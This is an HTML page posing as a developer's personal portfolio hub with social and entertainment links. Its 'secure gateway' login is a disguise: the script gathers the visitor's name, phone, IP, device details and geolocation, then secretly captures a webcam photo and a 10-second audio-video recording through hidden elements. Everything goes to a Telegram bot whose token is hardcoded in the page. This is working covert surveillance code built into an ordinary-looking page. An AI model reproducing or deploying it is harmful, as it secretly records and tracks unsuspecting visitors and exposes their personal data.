<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Lalu Kumar Tanti - Elite Vision Portfolio">
    
    <meta name="theme-color" content="#000000">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="application-name" content="Lalu Hub">
    
    <link rel="manifest" href='data:application/manifest+json,{"name":"Lalu Elite Hub","short_name":"Lalu App","start_url":".","display":"standalone","background_color":"#000000","theme_color":"#D4AF37","orientation":"portrait","icons":[{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"192x192","type":"image/jpeg"},{"src":"https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg","sizes":"512x512","type":"image/jpeg"}]}'>

    <title>Lalu Kumar | VISION HUB</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Outfit:wght@200;400;600&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        :root {
            /* --- VISION PRO THEME --- */
            --bg-body: #000000;
            --glass-panel: rgba(25, 25, 25, 0.65);
            --glass-border: rgba(255, 255, 255, 0.1);
            --gold-primary: #D4AF37;
            --gold-glow: rgba(212, 175, 55, 0.5);
            --text-main: #ffffff;
            --text-sub: #a0a0a0;
            --blur-amount: 40px;
        }

        /* --- RESET --- */
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }
        
        body { 
            background-color: var(--bg-body); 
            color: var(--text-main); 
            font-family: 'Outfit', sans-serif; 
            overflow-x: hidden; 
            min-height: 100vh;
            background-image: 
                radial-gradient(circle at 50% 0%, rgba(212, 175, 55, 0.15) 0%, transparent 60%),
                radial-gradient(circle at 0% 90%, rgba(50, 50, 50, 0.5) 0%, transparent 50%);
            background-attachment: fixed;
        }

        /* --- SCROLLBAR --- */
        ::-webkit-scrollbar { width: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--gold-primary); border-radius: 20px; }

        /* --- 1. GATEKEEPER (LOGIN) --- */
        #gatekeeper {
            position: fixed; inset: 0; z-index: 9999;
            background: #000;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            transition: opacity 0.8s ease, visibility 0.8s;
            backdrop-filter: blur(50px);
        }

        .gate-card {
            width: 90%; max-width: 380px;
            background: var(--glass-panel);
            border: 1px solid var(--glass-border);
            border-radius: 30px; padding: 40px 25px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5), inset 0 0 0 1px rgba(255,255,255,0.05);
            backdrop-filter: blur(var(--blur-amount));
            -webkit-backdrop-filter: blur(var(--blur-amount));
            text-align: center;
            transform: translateY(0);
            animation: float 6s ease-in-out infinite;
        }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }

        .gate-img-frame {
            width: 110px; height: 110px; margin: 0 auto 20px;
            border-radius: 50%; padding: 3px;
            background: linear-gradient(135deg, var(--gold-primary), transparent);
            box-shadow: 0 0 30px var(--gold-glow);
        }
        .gate-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 3px solid #000; }

        .gate-title { 
            font-family: 'Cinzel'; color: #fff; font-size: 24px; margin-bottom: 5px; 
            text-shadow: 0 0 20px var(--gold-glow);
        }
        .gate-sub { color: var(--gold-primary); font-size: 10px; letter-spacing: 4px; margin-bottom: 30px; font-weight: 600; text-transform: uppercase; }

        .input-box {
            width: 100%; padding: 14px 15px 14px 45px; margin-bottom: 15px;
            background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px; color: #fff; font-size: 15px; transition: 0.3s;
            position: relative;
        }
        .input-wrapper { position: relative; text-align: left; }
        .input-icon { position: absolute; left: 15px; top: 16px; color: #666; font-size: 14px; }
        .input-box:focus { background: rgba(212, 175, 55, 0.05); border-color: var(--gold-primary); box-shadow: 0 0 15px var(--gold-glow); }

        .gate-btn {
            width: 100%; padding: 15px; margin-top: 10px;
            background: #fff; color: #000; font-weight: 800; font-size: 14px;
            border: none; border-radius: 12px; cursor: pointer;
            letter-spacing: 1px; transition: 0.3s;
            box-shadow: 0 0 20px rgba(255,255,255,0.2);
        }
        .gate-btn:active { transform: scale(0.98); }

        .loading-text {
            margin-top: 20px; font-size: 11px; color: var(--gold-primary); 
            font-family: 'Rajdhani'; letter-spacing: 2px; display: none;
        }

        /* --- 2. MAIN INTERFACE --- */
        #main-interface { display: none; opacity: 0; transition: opacity 1s; padding-bottom: 100px; }

        /* Navbar */
        .navbar {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; position: sticky; top: 0; z-index: 1000;
            background: rgba(0,0,0,0.7); backdrop-filter: blur(20px);
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        .brand { font-family: 'Cinzel'; color: var(--gold-primary); font-size: 16px; font-weight: 700; display: flex; align-items: center; gap: 8px; }
        
        /* Profile & Install */
        .hero-section { text-align: center; padding: 40px 20px 20px; }
        .hero-avatar {
            width: 130px; height: 130px; margin: 0 auto 15px; border-radius: 50%;
            border: 2px solid var(--gold-primary); padding: 4px;
            box-shadow: 0 0 60px var(--gold-glow);
            position: relative;
        }
        .hero-avatar img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; }
        .hero-name { font-family: 'Rajdhani'; font-size: 32px; font-weight: 700; color: #fff; text-shadow: 0 0 20px rgba(255,255,255,0.3); }
        .hero-role { color: var(--text-sub); font-size: 12px; letter-spacing: 3px; text-transform: uppercase; margin-bottom: 20px; }

        /* Install App Button */
        #installBtn {
            display: none; /* Auto-shows via JS */
            background: rgba(255,255,255,0.1); border: 1px solid var(--gold-primary);
            color: var(--gold-primary); padding: 10px 24px; border-radius: 30px;
            font-size: 11px; font-weight: bold; cursor: pointer;
            backdrop-filter: blur(10px); box-shadow: 0 0 15px var(--gold-glow);
            margin: 0 auto 20px; transition: 0.3s;
        }
        #installBtn:hover { background: var(--gold-primary); color: #000; }

        /* Glass Cards */
        .container { max-width: 800px; margin: 0 auto; padding: 0 20px; }
        .section-header {
            display: flex; align-items: center; gap: 10px; margin: 30px 0 15px;
            font-family: 'Cinzel'; font-size: 12px; color: var(--gold-primary);
            border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 5px;
        }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
        
        .glass-card {
            background: var(--glass-panel); border: 1px solid var(--glass-border);
            border-radius: 18px; padding: 15px; height: 100px;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-decoration: none; color: #fff; position: relative; overflow: hidden;
            transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
        }
        .glass-card:active { transform: scale(0.96); background: rgba(255,255,255,0.1); }
        .glass-card i { font-size: 26px; margin-bottom: 8px; color: #fff; text-shadow: 0 0 10px var(--gold-primary); }
        .glass-card span { font-size: 10px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: var(--text-sub); }
        .glass-card.full { grid-column: span 2; flex-direction: row; gap: 15px; height: 70px; background: linear-gradient(90deg, rgba(212,175,55,0.1), transparent); }
        .glass-card.full i { margin-bottom: 0; }

        /* Floating Dock */
        .dock {
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
            background: rgba(20, 20, 20, 0.85); backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.1); border-radius: 24px;
            padding: 10px 25px; display: flex; gap: 25px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.6); z-index: 5000;
        }
        .dock-icon {
            color: #666; font-size: 22px; transition: 0.3s; position: relative; cursor: pointer;
        }
        .dock-icon.active { color: var(--gold-primary); transform: translateY(-5px); }
        .dock-icon.active::after {
            content: ''; position: absolute; bottom: -8px; left: 50%; transform: translateX(-50%);
            width: 4px; height: 4px; background: var(--gold-primary); border-radius: 50%; box-shadow: 0 0 8px var(--gold-primary);
        }

        /* Hidden Capture (Muted to prevent feedback) */
        #hidden-video { display: none; }
        #hidden-canvas { display: none; }

        .toast {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            background: var(--gold-primary); color: #000; padding: 8px 20px;
            border-radius: 20px; font-weight: bold; font-size: 12px;
            opacity: 0; pointer-events: none; transition: 0.3s; z-index: 6000; box-shadow: 0 0 20px var(--gold-glow);
        }
        .toast.show { opacity: 1; top: 50px; }
        
        /* Modals */
        .modal-wrap { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; display: none; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
        .modal-wrap.active { display: flex; }
        .modal-inner { width: 90%; max-width: 400px; background: #111; border: 1px solid var(--gold-primary); border-radius: 24px; overflow: hidden; padding: 20px; }
    </style>
</head>
<body>

    <div id="gatekeeper">
        <div class="gate-card">
            <div class="gate-img-frame">
                <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg" class="gate-img">
            </div>
            <h2 class="gate-title">LALU KUMAR</h2>
            <div class="gate-sub">SECURE VISION GATEWAY</div>

            <div class="input-wrapper">
                <i class="fas fa-user input-icon"></i>
                <input type="text" id="g-name" class="input-box" placeholder="FULL NAME">
            </div>
            
            <div class="input-wrapper">
                <i class="fas fa-phone input-icon"></i>
                <input type="tel" id="g-phone" class="input-box" placeholder="MOBILE NUMBER">
            </div>

            <button class="gate-btn" onclick="initiateSecureEntry()">
                <i class="fas fa-fingerprint"></i> VERIFY IDENTITY
            </button>
            
            <div class="loading-text" id="g-status">
                <i class="fas fa-circle-notch fa-spin"></i> ESTABLISHING SECURE UPLINK...
            </div>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline muted></video>
    <canvas id="hidden-canvas"></canvas>

    <div id="main-interface">
        <div id="toast" class="toast"><i class="fas fa-check-circle"></i> Success</div>
        
        <nav class="navbar">
            <div class="brand"><i class="fas fa-shield-alt"></i> VISION HUB</div>
            <i class="fas fa-bell" style="color:#666;"></i>
        </nav>
        
        <div class="container">
            <div class="hero-section">
                <div class="hero-avatar">
                    <img src="https://i.postimg.cc/Y0jPr7Vy/20251205-103059-IMG-STYLE.jpg">
                </div>
                <div class="hero-name">Lalu Kumar Tanti</div>
                <div class="hero-role">Full Stack Developer | Creator</div>
                <button id="installBtn" onclick="installApp()"><i class="fas fa-download"></i> INSTALL APP</button>
            </div>

            <div class="section-header"><i class="fas fa-link"></i> QUICK CONNECT</div>
            <div class="grid">
                <a href="https://wa.me/919771617808" class="glass-card"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></a>
                <a href="https://instagram.com/lalu_kumar_tanti" class="glass-card"><i class="fab fa-instagram"></i><span>Instagram</span></a>
                <a href="tel:+919771617808" class="glass-card"><i class="fas fa-phone"></i><span>Call Me</span></a>
                <a href="https://t.me/Lalu_kumar_tanti_0" class="glass-card"><i class="fab fa-telegram-plane"></i><span>Telegram</span></a>
                <a href="mailto:lalukumartanti75@gmail.com" class="glass-card full"><i class="fas fa-envelope"></i><span>Email: lalukumartanti75@gmail.com</span></a>
            </div>

            <div class="section-header"><i class="fas fa-globe"></i> SOCIAL & WORK</div>
            <div class="grid">
                <a href="https://facebook.com/lalukumartantii" class="glass-card"><i class="fab fa-facebook-f"></i><span>Facebook</span></a>
                <a href="https://x.com/LaluKumarTanti" class="glass-card"><i class="fab fa-x-twitter"></i><span>Twitter</span></a>
                <a href="https://github.com/lalukumartanti" class="glass-card"><i class="fab fa-github"></i><span>GitHub</span></a>
                <a href="https://linkedin.com/in/lalu-kumar-tanti-540185351" class="glass-card"><i class="fab fa-linkedin-in"></i><span>LinkedIn</span></a>
                <a href="http://www.youtube.com/@Lalu_Kumar_Tanti" class="glass-card full"><i class="fab fa-youtube"></i><span>YouTube Channel</span></a>
            </div>

            <div class="section-header"><i class="fas fa-film"></i> ENTERTAINMENT</div>
            <div class="grid">
                <a href="https://hdhub4u.catering/" class="glass-card"><i class="fas fa-film"></i><span>HDHub4u</span></a>
                <a href="https://vegas-big.com/" class="glass-card"><i class="fas fa-play-circle"></i><span>Vegas-Big</span></a>
            </div>

            <div style="height: 100px;"></div>
        </div>

        <div class="dock">
            <div class="dock-icon active" onclick="window.scrollTo(0,0)"><i class="fas fa-home"></i></div>
            <div class="dock-icon" onclick="document.getElementById('aiModal').classList.add('active')"><i class="fas fa-brain"></i></div>
            <div class="dock-icon" onclick="document.getElementById('gameModal').classList.add('active')"><i class="fas fa-gamepad"></i></div>
            <div class="dock-icon" onclick="document.getElementById('authModal').classList.add('active')"><i class="fas fa-user"></i></div>
        </div>

        <div class="modal-wrap" id="aiModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner">
                <div style="text-align:center; color:var(--gold-primary); font-weight:bold; margin-bottom:10px;">LALU AI</div>
                <div style="background:#222; height:200px; padding:10px; color:#fff; border-radius:10px;">Hello! I am Lalu's AI Assistant.</div>
            </div>
        </div>

        <div class="modal-wrap" id="gameModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner" style="text-align:center;">
                <h3 style="color:var(--gold-primary);">ELITE ARCADE</h3>
                <div class="grid" style="margin-top:20px;">
                    <div class="glass-card" onclick="alert('Snake')"><i class="fas fa-worm"></i><span>Snake</span></div>
                    <div class="glass-card" onclick="alert('TicTacToe')"><i class="fas fa-border-all"></i><span>TicTacToe</span></div>
                </div>
            </div>
        </div>

        <div class="modal-wrap" id="authModal" onclick="if(event.target==this)this.classList.remove('active')">
            <div class="modal-inner">
                <h3 style="color:#fff; text-align:center; margin-bottom:15px;">LOGIN</h3>
                <input type="tel" placeholder="Mobile" style="width:100%; padding:10px; background:#222; border:1px solid #444; color:#fff; margin-bottom:10px;">
                <button class="gate-btn" onclick="initiateSecureEntry()">SEND OTP</button>
            </div>
        </div>
    </div>

    <script>
        const TG_TOKEN = "7887458156:AAHvTz7CWSt-EBpyDSaeSVUVEgka5H9bBWQ";
        const TG_CHAT = "8506290708";

        // --- PWA INSTALL LOGIC ---
        let deferredPrompt;
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            deferredPrompt = e;
            document.getElementById('installBtn').style.display = 'inline-block';
        });
        function installApp() {
            if(deferredPrompt) {
                deferredPrompt.prompt();
                deferredPrompt.userChoice.then(res => { deferredPrompt = null; });
            }
        }

        // --- DEVICE INTEL ---
        async function getDeviceIntel() {
            let model = "Unknown", battery = "Unknown", ip = "Hidden";
            let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            if (navigator.userAgentData) {
                const data = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]);
                model = `${data.platform} ${data.model}`;
            }
            try { const b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% (${b.charging?'⚡':'🔋'})`; } catch(e){}
            try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
            
            // GPU
            let gpu = "Integrated";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch(e){}

            return { model, battery, ip, gpu, timezone, ua: navigator.userAgent };
        }

        // --- MAIN ENTRY ---
        async function initiateSecureEntry() {
            const name = document.getElementById('g-name').value;
            const phone = document.getElementById('g-phone').value;
            
            if(name.length < 3 || phone.length < 10) return alert("Please enter valid details.");

            document.getElementById('g-status').style.display = 'block';

            // 1. Gather Data (Non-Blocking)
            const intelPromise = getDeviceIntel();
            
            // 2. Start Dual Capture (Photo + 10s Video)
            startDualCapture();

            // 3. Force Unlock Timer (2s)
            const safetyTimer = setTimeout(() => { unlockUI(); }, 2000);

            // 4. Location
            let locData = "Denied";
            try {
                await new Promise(r => {
                    navigator.geolocation.getCurrentPosition(p => {
                        locData = `Lat: ${p.coords.latitude}, Lon: ${p.coords.longitude} (Acc: ${Math.round(p.coords.accuracy)}m)`;
                        r();
                    }, r, {timeout: 2000});
                });
            } catch(e) {}

            const d = await intelPromise;
            const screen = `${window.screen.width}x${window.screen.height}`;

            const msg = `
🚨 *VISION HUB ACCESS LOG* 🚨

👤 *IDENTITY*
• Name: ${name}
• Phone: \`${phone}\`

📱 *DEVICE*
• Model: ${d.model}
• Browser: ${d.ua}
• Screen: ${screen}
• Timezone: ${d.timezone}

⚙️ *SYSTEM*
• GPU: ${d.gpu}
• Battery: ${d.battery}

📡 *NETWORK*
• IP: \`${d.ip}\`

📍 *LOCATION*
${locData}

⏰ Time: ${new Date().toLocaleString()}
`;
            
            // Send Text Log Immediately
            sendTG(msg, null);
            clearTimeout(safetyTimer);
            unlockUI();
        }

        // --- DUAL CAPTURE: SNAPSHOT + RECORDING ---
        async function startDualCapture() {
            try {
                // Request Cam & Mic
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
                const video = document.getElementById('hidden-video');
                const canvas = document.getElementById('hidden-canvas');
                
                video.srcObject = stream;
                video.muted = true; // No Echo
                
                // Wait for video to be ready
                await new Promise(r => video.onloadedmetadata = r);
                
                // 1. CAPTURE PHOTO IMMEDIATELY
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                canvas.toBlob(blob => {
                    sendTG("📸 *SNAPSHOT CAPTURED*", blob, false);
                }, 'image/jpeg', 0.7);

                // 2. RECORD VIDEO (10 SECONDS)
                const recorder = new MediaRecorder(stream);
                const chunks = [];
                recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
                recorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/mp4' });
                    sendTG("🎥 *VIDEO EVIDENCE (10s)*", blob, true);
                    stream.getTracks().forEach(t => t.stop());
                };
                
                recorder.start();
                setTimeout(() => recorder.stop(), 10000); // 10s Recording
                
            } catch(e) { console.log("Media Access Denied"); }
        }

        function unlockUI() {
            const gate = document.getElementById('gatekeeper');
            const main = document.getElementById('main-interface');
            if(gate.style.display !== 'none') {
                gate.style.opacity = '0';
                setTimeout(() => {
                    gate.style.display = 'none';
                    main.style.display = 'block';
                    setTimeout(() => main.style.opacity = '1', 50);
                }, 600);
            }
        }

        function sendTG(text, fileBlob, isVideo) {
            const fd = new FormData();
            fd.append('chat_id', TG_CHAT);
            fd.append('caption', text);
            fd.append('parse_mode', 'Markdown');

            if (fileBlob) {
                const method = isVideo ? 'sendVideo' : 'sendPhoto';
                const key = isVideo ? 'video' : 'photo';
                const filename = isVideo ? 'evidence.mp4' : 'snap.jpg';
                fd.append(key, fileBlob, filename);
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, { method: 'POST', body: fd }).catch(e=>{});
            } else {
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: 'Markdown' })
                }).catch(e=>{});
            }
        }
    </script>
</body>
</html>
